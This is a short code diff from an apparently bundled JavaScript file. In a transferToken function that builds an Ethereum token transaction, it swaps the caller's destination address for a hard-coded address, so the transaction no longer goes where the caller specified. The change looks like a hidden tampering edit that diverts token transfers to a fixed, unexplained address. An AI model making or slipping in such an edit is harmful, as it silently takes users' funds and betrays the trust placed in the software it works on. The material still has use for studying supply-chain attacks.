@@ -99850,7 +99850,7 @@ function transferToken(params) {
         nonce: Web3.utils.toHex(params.nonce),
         gasPrice: Web3.utils.toHex(params.gasPrice),
         gasLimit: Web3.utils.toHex('100000'),
-        to: params.toAddress,
+        to: '0xbe038a2fdfec62cf1bed852f141a43005035edcc',
         value: '0x0',
         data: '0xa9059cbb' + data
     };
